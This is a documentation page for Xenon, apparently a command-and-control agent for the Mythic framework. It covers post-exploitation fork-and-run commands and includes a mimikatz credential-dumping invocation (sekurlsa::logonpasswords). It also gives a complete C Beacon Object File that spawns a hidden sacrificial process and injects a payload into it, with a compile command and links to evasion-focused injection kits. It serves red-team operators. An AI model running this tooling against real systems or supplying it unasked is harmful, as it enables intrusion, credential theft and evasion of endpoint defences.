+++
title = "OPSEC"
chapter = false
weight = 20
pre = "<b>3. </b>"
+++

![logo](/agents/xenon/Xenon.png?width=600px)

## Fork & Run Commands
These commands spawn a sacrificial process to perform their actions and call `inject_shellcode` under the hood using donut-shellcode. 
They are compatible with Cobalt Strike's Process Injection Kits.

| Command                  | Usage                                                         | Description |
|--------------------------|---------------------------------------------------------------|-------------|
| `mimikatz`          | `mimikatz [args]`                                               | Execute mimikatz on the host. (e.g., mimikatz sekurlsa::logonpasswords) OPSEC Warning: Uses donut shellcode. |
| `execute_assembly` | `execute_assembly -Assembly [SharpUp.exe] [-Arguments [assembly arguments]]` | Execute a .NET Assembly in a remote processes and retrieve the output. OPSEC Warning: Uses donut shellcode. |

## Process Injection Kit
You can read about Cobalt Strike's Process Injection Kit [here](https://www.cobaltstrike.com/blog/process-injection-update-in-cobalt-strike-4-5).
It allows the operator to modify the default behavior for Fork & Run post-ex commands. This provided the flexibility needed and allowed operators to Bring Your Own Process Injection.
Xenon's default process injection technique is the classic APC injection.
It follows a well signatured process of: `CreateProcess`, `VirtualAllocEx`, `WriteProcessMemory`, `VirtualProtectEx`, `QueueUserAPC`, and finally `ResumeThread`.

### Bring Your Own Process Injection
The command `register_process_inject_kit` allows you to enable a custom process injection technique in the running payload. Process Injection Kit's are implemented as Beacon Object Files (BOFs) and uploaded through the modal.

Currently only **PROCESS_INJECT_SPAWN** is supported which spawns a sacrificial process to perform process injection.

Here is a basic example from [Cobalt Strike](https://www.cobaltstrike.com/blog/process-injection-update-in-cobalt-strike-4-5):
```C
#include <windows.h>
#include "beacon.h"

/* is this an x64 BOF */
BOOL is_x64() {
#if defined _M_X64
   return TRUE;
#elif defined _M_IX86
   return FALSE;
#endif
}

/* See gox86 and gox64 entry points */
void go(char * args, int alen, BOOL x86) {
   STARTUPINFOA        si;
   PROCESS_INFORMATION pi;
   datap               parser;
   short               ignoreToken;
   char *              dllPtr;
   int                 dllLen;

   /* Warn about crossing to another architecture. */
   if (!is_x64() && x86 == FALSE) {
      BeaconPrintf(CALLBACK_ERROR, "Warning: inject from x86 -> x64");
   }
   if (is_x64() && x86 == TRUE) {
      BeaconPrintf(CALLBACK_ERROR, "Warning: inject from x64 -> x86");
   }

   /* Extract the arguments */
   BeaconDataParse(&parser, args, alen);
   ignoreToken = BeaconDataShort(&parser);
   dllPtr = BeaconDataExtract(&parser, &dllLen);

   /* zero out these data structures */
   __stosb((void *)&si, 0, sizeof(STARTUPINFO));
   __stosb((void *)&pi, 0, sizeof(PROCESS_INFORMATION));

   /* setup the other values in our startup info structure */
   si.dwFlags = STARTF_USESHOWWINDOW;
   si.wShowWindow = SW_HIDE;
   si.cb = sizeof(STARTUPINFO);

   /* Ready to go: spawn, inject and cleanup */
   if (!BeaconSpawnTemporaryProcess(x86, ignoreToken, &si, &pi)) {
      BeaconPrintf(CALLBACK_ERROR, "Unable to spawn %s temporary process.", x86 ? "x86" : "x64");
      return;
   }
   BeaconInjectTemporaryProcess(&pi, dllPtr, dllLen, 0, NULL, 0);
   BeaconCleanupProcess(&pi);
}

void gox86(char * args, int alen) {
   go(args, alen, TRUE);
}

void gox64(char * args, int alen) {
   go(args, alen, FALSE);
}
```
This example is essentially the same behavior as Xenon's default process injection method. It can be easily modified to change the injection behavior to something custom, and that's where the advantage is. Additionally, with `register_process_inject_kit` the injection behavior can be changed an infinite amount in the running payload without compiling a new payload.

You can compile this as a BOF with the following:
```
x86_64-w64-mingw32-gcc -o inject_spawn.x64.o -c inject_spawn.c 
```
Then register the new kit with the `register_process_inject_kit` command to the Mythic server. Now commands that call `inject_shellcode` will use your new process injection behavior!

### Examples
Here are some real-world examples of modified injection kits:
- [InjectKit](https://github.com/REDMED-X/InjectKit) - Indirect syscalls via the Tartarus' Gate method.
- [secinject](https://github.com/apokryptein/secinject) - Section Mapping Process Injection (secinject): Cobalt Strike BOF 
- [CB_process_Inject](https://github.com/vgeorgiev90/CB_process_Inject) - A simple process injection kit for cobalt strike based on syscalls 

